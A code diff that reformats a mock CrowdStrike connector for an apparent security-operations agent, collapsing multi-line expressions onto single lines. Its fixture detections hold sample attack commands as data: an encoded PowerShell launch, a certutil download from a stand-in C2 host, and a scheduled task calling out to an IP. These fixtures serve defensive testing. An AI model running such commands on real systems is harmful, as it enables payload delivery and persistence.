@@ -20,9 +20,7 @@ from langchain_core.tools import tool
 
 logger = logging.getLogger("btagent.mcp.servers.crowdstrike")
 
-MOCK_MODE = (
-    os.getenv("BTAGENT_MOCK_CONNECTORS", "true").lower() == "true"
-)
+MOCK_MODE = os.getenv("BTAGENT_MOCK_CONNECTORS", "true").lower() == "true"
 
 
 # ---------------------------------------------------------------------------
@@ -48,26 +46,15 @@ _MOCK_DETECTIONS = [
             {
                 "behavior_id": "beh_01HXR4ABCDEF_001",
                 "filename": "powershell.exe",
-                "filepath": (
-                    "C:\\Windows\\System32\\"
-                    "WindowsPowerShell\\v1.0\\powershell.exe"
-                ),
-                "cmdline": (
-                    "powershell.exe -enc "
-                    "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA..."
-                ),
+                "filepath": ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"),
+                "cmdline": ("powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA..."),
                 "parent_details": {
                     "parent_process_graph_id": "pid:dev01:6140",
-                    "parent_cmdline": (
-                        'cmd.exe /c "start /b powershell -enc ..."'
-                    ),
+                    "parent_cmdline": ('cmd.exe /c "start /b powershell -enc ..."'),
                     "parent_image_filename": "cmd.exe",
                 },
                 "user_name": "ACME\\jsmith",
-                "sha256": (
-                    "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6"
-                    "e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2"
-                ),
+                "sha256": ("a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2"),
                 "ioc_type": "sha256",
                 "severity": 90,
                 "confidence": 95,
@@ -101,9 +88,7 @@ _MOCK_DETECTIONS = [
             {
                 "behavior_id": "beh_01HXR4ABCDEF_002",
                 "filename": "certutil.exe",
-                "filepath": (
-                    "C:\\Windows\\System32\\certutil.exe"
-                ),
+                "filepath": ("C:\\Windows\\System32\\certutil.exe"),
                 "cmdline": (
                     "certutil.exe -urlcache -split -f "
                     "https://evil-c2.example.com/payload.bin "
@@ -112,16 +97,11 @@ _MOCK_DETECTIONS = [
                 ),
                 "parent_details": {
                     "parent_process_graph_id": "pid:dev01:7284",
-                    "parent_cmdline": (
-                        "powershell.exe -enc ..."
-                    ),
+                    "parent_cmdline": ("powershell.exe -enc ..."),
                     "parent_image_filename": "powershell.exe",
                 },
                 "user_name": "ACME\\jsmith",
-                "sha256": (
-                    "f1e2d3c4b5a6f7e8d9c0b1a2f3e4d5c6"
-                    "b7a8f9e0d1c2b3a4f5e6d7c8b9a0f1e2"
-                ),
+                "sha256": ("f1e2d3c4b5a6f7e8d9c0b1a2f3e4d5c6b7a8f9e0d1c2b3a4f5e6d7c8b9a0f1e2"),
                 "ioc_type": "sha256",
                 "severity": 70,
                 "confidence": 85,
@@ -155,27 +135,20 @@ _MOCK_DETECTIONS = [
             {
                 "behavior_id": "beh_01HXR4GHIJKL_001",
                 "filename": "schtasks.exe",
-                "filepath": (
-                    "C:\\Windows\\System32\\schtasks.exe"
-                ),
+                "filepath": ("C:\\Windows\\System32\\schtasks.exe"),
                 "cmdline": (
                     "schtasks /create /sc minute /mo 15 "
                     '/tn "SystemHealthCheck" '
-                    "/tr \"C:\\ProgramData\\svchost.exe "
+                    '/tr "C:\\ProgramData\\svchost.exe '
                     '-connect 198.51.100.23:443"'
                 ),
                 "parent_details": {
                     "parent_process_graph_id": "pid:dev02:3204",
-                    "parent_cmdline": (
-                        "cmd.exe /c schtasks ..."
-                    ),
+                    "parent_cmdline": ("cmd.exe /c schtasks ..."),
                     "parent_image_filename": "cmd.exe",
                 },
                 "user_name": "ACME\\svc_backup",
-                "sha256": (
-                    "c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8"
-                    "a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4"
-                ),
+                "sha256": ("c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4"),
                 "ioc_type": "sha256",
                 "severity": 50,
                 "confidence": 70,
@@ -282,15 +255,9 @@ _MOCK_EVENTS = [
         "hostname": "WS-JSMITH-PC",
         "user_name": "ACME\\jsmith",
         "filename": "powershell.exe",
-        "cmdline": (
-            "powershell.exe -enc "
-            "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA..."
-        ),
+        "cmdline": ("powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA..."),
         "parent_image_filename": "cmd.exe",
-        "sha256": (
-            "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6"
-            "e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2"
-        ),
+        "sha256": ("a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2"),
         "source_ip": "10.1.42.17",
     },
     {
@@ -300,15 +267,9 @@ _MOCK_EVENTS = [
         "hostname": "WS-JSMITH-PC",
         "user_name": "ACME\\jsmith",
         "filename": "certutil.exe",
-        "cmdline": (
-            "certutil.exe -urlcache -split -f "
-            "https://evil-c2.example.com/payload.bin ..."
-        ),
+        "cmdline": ("certutil.exe -urlcache -split -f https://evil-c2.example.com/payload.bin ..."),
         "parent_image_filename": "powershell.exe",
-        "sha256": (
-            "f1e2d3c4b5a6f7e8d9c0b1a2f3e4d5c6"
-            "b7a8f9e0d1c2b3a4f5e6d7c8b9a0f1e2"
-        ),
+        "sha256": ("f1e2d3c4b5a6f7e8d9c0b1a2f3e4d5c6b7a8f9e0d1c2b3a4f5e6d7c8b9a0f1e2"),
         "source_ip": "10.1.42.17",
     },
     {
@@ -348,9 +309,7 @@ class CrowdStrikeMCPServer:
     server_id: str = "crowdstrike"
 
     def __init__(self, *, mock_mode: bool | None = None) -> None:
-        self.mock_mode = (
-            mock_mode if mock_mode is not None else MOCK_MODE
-        )
+        self.mock_mode = mock_mode if mock_mode is not None else MOCK_MODE
 
     # ---- tools ----
 
@@ -427,9 +386,7 @@ class CrowdStrikeMCPServer:
 
     # ---- mock implementations ----
 
-    def _mock_get_detections(
-        self, limit: int, severity: str
-    ) -> dict[str, Any]:
+    def _mock_get_detections(self, limit: int, severity: str) -> dict[str, Any]:
         if severity == "all":
             detections = _MOCK_DETECTIONS[:limit]
         else:
@@ -440,11 +397,7 @@ class CrowdStrikeMCPServer:
                 "low": 30,
             }
             min_sev = sev_map.get(severity.lower(), 0)
-            detections = [
-                d
-                for d in _MOCK_DETECTIONS
-                if d["max_severity"] >= min_sev
-            ][:limit]
+            detections = [d for d in _MOCK_DETECTIONS if d["max_severity"] >= min_sev][:limit]
         return {
             "status": "success",
             "total": len(detections),
@@ -462,9 +415,7 @@ class CrowdStrikeMCPServer:
             }
         return {
             "status": "not_found",
-            "message": (
-                f"Host '{hostname}' not found in CrowdStrike"
-            ),
+            "message": (f"Host '{hostname}' not found in CrowdStrike"),
             "is_mock": True,
         }
 
@@ -491,13 +442,9 @@ class CrowdStrikeMCPServer:
             "is_mock": True,
         }
 
-    def _mock_search_events(
-        self, query: str, timeframe: str
-    ) -> dict[str, Any]:
+    def _mock_search_events(self, query: str, timeframe: str) -> dict[str, Any]:
         q_lower = query.lower()
-        events = [
-            e for e in _MOCK_EVENTS if q_lower in str(e).lower()
-        ]
+        events = [e for e in _MOCK_EVENTS if q_lower in str(e).lower()]
         if not events:
             events = _MOCK_EVENTS
         return {
@@ -511,29 +458,17 @@ class CrowdStrikeMCPServer:
 
     # ---- real implementations (placeholders) ----
 
-    def _real_get_detections(
-        self, limit: int, severity: str
-    ) -> dict[str, Any]:
-        raise NotImplementedError(
-            "Real CrowdStrike detections not yet implemented"
-        )
+    def _real_get_detections(self, limit: int, severity: str) -> dict[str, Any]:
+        raise NotImplementedError("Real CrowdStrike detections not yet implemented")
 
     def _real_host_details(self, hostname: str) -> dict[str, Any]:
-        raise NotImplementedError(
-            "Real CrowdStrike host details not yet implemented"
-        )
+        raise NotImplementedError("Real CrowdStrike host details not yet implemented")
 
     def _real_isolate_host(self, hostname: str) -> dict[str, Any]:
-        raise NotImplementedError(
-            "Real CrowdStrike isolation not yet implemented"
-        )
+        raise NotImplementedError("Real CrowdStrike isolation not yet implemented")
 
-    def _real_search_events(
-        self, query: str, timeframe: str
-    ) -> dict[str, Any]:
-        raise NotImplementedError(
-            "Real CrowdStrike event search not yet implemented"
-        )
+    def _real_search_events(self, query: str, timeframe: str) -> dict[str, Any]:
+        raise NotImplementedError("Real CrowdStrike event search not yet implemented")
 
     # ---- tool metadata ----
 
@@ -551,9 +486,7 @@ class CrowdStrikeMCPServer:
                     "properties": {
                         "limit": {
                             "type": "integer",
-                            "description": (
-                                "Maximum detections to return"
-                            ),
+                            "description": ("Maximum detections to return"),
                             "default": 50,
                         },
                         "severity": {
@@ -602,9 +535,7 @@ class CrowdStrikeMCPServer:
                     "properties": {
                         "hostname": {
                             "type": "string",
-                            "description": (
-                                "Hostname to isolate"
-                            ),
+                            "description": ("Hostname to isolate"),
                         },
                     },
                     "required": ["hostname"],
@@ -613,8 +544,7 @@ class CrowdStrikeMCPServer:
             {
                 "name": "cs_search_events",
                 "description": (
-                    "Search CrowdStrike Falcon event telemetry "
-                    "by hostname, IP, hash, or filename."
+                    "Search CrowdStrike Falcon event telemetry by hostname, IP, hash, or filename."
                 ),
                 "server_id": self.server_id,
                 "input_schema": {
@@ -626,9 +556,7 @@ class CrowdStrikeMCPServer:
                         },
                         "timeframe": {
                             "type": "string",
-                            "description": (
-                                "Time window (e.g. 1h, 24h, 7d)"
-                            ),
+                            "description": ("Time window (e.g. 1h, 24h, 7d)"),
                             "default": "24h",
                         },
                     },
